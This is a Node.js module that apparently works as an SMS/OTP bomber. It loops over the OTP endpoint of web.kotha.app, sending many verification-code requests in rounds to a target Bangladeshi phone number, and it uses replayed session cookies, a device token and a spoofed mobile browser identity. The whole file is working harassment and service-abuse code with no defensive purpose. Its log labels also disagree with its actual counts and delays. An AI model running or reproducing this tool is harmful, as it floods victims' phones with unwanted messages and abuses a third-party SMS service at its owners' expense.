const axios = require("axios");

async function kotha(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const response = await axios.post(
  'https://web.kotha.app/api/otp',
  {
    'number': `+88${number}`,
    'retryAttempt': 0,
    'deviceToken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VJZCI6IjM0NTZjYjhmLTIzM2QtNGI3MS04MWM1LTU4NGViZWM0MmZjYiIsImlhdCI6MTc1MDc2MDg4MiwiZXhwIjoxNzUwNzYxNzgyfQ.SR8qeUKurzMXExCVFmmi30k9N7kTzjhwJdT6fJy226A',
    'deviceId': '3456cb8f-233d-4b71-81c5-584ebec42fcb'
  },
  {
    headers: {
      'authority': 'web.kotha.app',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga_5Q0583973Z=GS2.1.s1750760835$o1$g0$t1750760835$j60$l0$h0; _ga=GA1.1.875733277.1750760835; AWSALBCORS=at9Yexi+0tm4dMhQXTkqlC8oQcqU/IIO1NbWHCQ2jofPwkNgsMtDzDe/uu7eH9XljqoA6fp9/6gECo8zvpEaUxqG9ZEac9ZvPXSRHtO5OuL96skde2iuaD5nj0tS; __Host-next-auth.csrf-token=e7b0b30e83c0d5cd60d40370fb618c9caa55601df14690b33479a769df805f9f%7C1079da5c29bf344f80588dbf4826cb6bac8093cb721d13c01ed90a45eb927da7; _gcl_au=1.1.1095184874.1750760848; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750760847$o1$g1$t1750760881$j26$l0$h712145416; AWSALB=YaizmUAC7bj3Qw6D5RIQgITqYJxJT8RRjxY8LM2oAMYOkSC+KMm5dI6CemDvoVkNSZJRryzsOgIAPvIorKCsDy3fXL2aZaQsfAWv791wgcWse2vW9fp3To6511+K',
      'origin': 'https://web.kotha.app',
      'referer': 'https://web.kotha.app/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);

        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { kotha };
